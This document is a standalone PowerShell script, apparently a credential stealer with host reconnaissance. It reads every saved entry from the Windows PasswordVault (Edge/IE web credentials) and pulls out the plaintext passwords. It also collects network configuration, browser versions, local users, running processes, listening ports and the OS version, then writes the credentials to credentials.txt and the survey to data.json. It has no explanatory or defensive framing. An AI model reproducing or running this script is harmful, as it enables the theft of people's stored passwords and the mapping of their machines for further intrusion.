# Function to read the IE/Edge password vault (Web Credentials portion of credential manager)

function Get-PasswordVaultCredentials {
    #initilize empty array
    $CRED_MANAGER_CREDS_LST = @()

    try
    {
        #Load the WinRT projection for the PasswordVault
        $Script:vaultType = [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
        $Script:vault =  new-object Windows.Security.Credentials.PasswordVault -ErrorAction silentlycontinue
        
        $Results = $Script:vault.RetrieveAll()
        foreach($credentry in  $Results)
        {
                $credobject = $Script:vault.Retrieve( $credentry.Resource, $credentry.UserName )
                $obj = New-Object PSObject                
                Add-Member -inputObject $obj -memberType NoteProperty -name "Username" -value "$($credobject.UserName)"                  
                Add-Member -inputObject $obj -memberType NoteProperty -name "Hostname" -value "$($credobject.Resource)" # URI need to be sanitised
                Add-Member -inputObject $obj -memberType NoteProperty -name "Password" -value "$($credobject.Password)" 
                $CRED_MANAGER_CREDS_LST += $obj                
        }
    }
    catch
    {
        Write-Host "Failed to instantiate passwordvault class. $($_.InvocationInfo.PositionMessage)"
    }
    return $CRED_MANAGER_CREDS_LST
}

$TAB =  "    "

#Get network data
$IPCONFIG = ipconfig /all
$IPCONFIG = '"' + "$IPCONFIG" + '"'

#Get data from navigators (listed manually)
$NAVIGATOR = Get-Process -Name "msedge" | Select-Object -First 1 | Select-Object ProductVersion
$NAVIGATOR = '"' + "Microsoft Edge: $NAVIGATOR" + ", "
$NAVIGATOR2 = Get-Process -Name "firefox" | Select-Object -First 1 | Select-Object ProductVersion
$NAVIGATOR += "Firefox: $NAVIGATOR2" + '"'

#Get data on local users
$USERS = Get-LocalUser | Select-Object Name, Enabled | Out-String
$USERS = '"' + "$USERS" + '"'
$USERS = $USERS -replace [environment]::NewLine, " "

#Get all active process
$ALLPROCESS = Get-Process
$ALLPROCESS = '"' + "$ALLPROCESS" + '"'
$ALLPROCESS = $ALLPROCESS -replace "System.Diagnostics.Process"

#Get ports in listening mode
$PORTS = Get-NetTcpConnection -State Listen | Select-Object LocalPort| Sort-Object -Property LocalPort | Out-String
$PORTS = '"' + "$PORTS" + '"'
$PORTS = $PORTS -replace [environment]::NewLine, " "

#Get the OS
$OSV = [Environment]::OSVersion | Select-Object VersionString
$OSV = '"' + "$OSV" + '"'

#Create the JSON
$OUT = "{`n"
$OUT += "$TAB" + '"Net": ' + "$IPCONFIG" + ",`n"
$OUT += "$TAB" + '"Navigateurs": ' + "$NAVIGATOR" + ",`n"
$OUT += "$TAB" + '"Logon": ' + "$USERS" + ",`n"
$OUT += "$TAB" + '"Process": ' + "$ALLPROCESS" + ",`n"
$OUT += "$TAB" + '"Ports listening to": ' + "$PORTS" + ",`n"
$OUT += "$TAB" + '"OS": ' + "$OSV" + "`n"
$OUT += "}"

#Write the JSON
$OUT > data.json

#Write the credentials
Get-PasswordVaultCredentials > credentials.txt
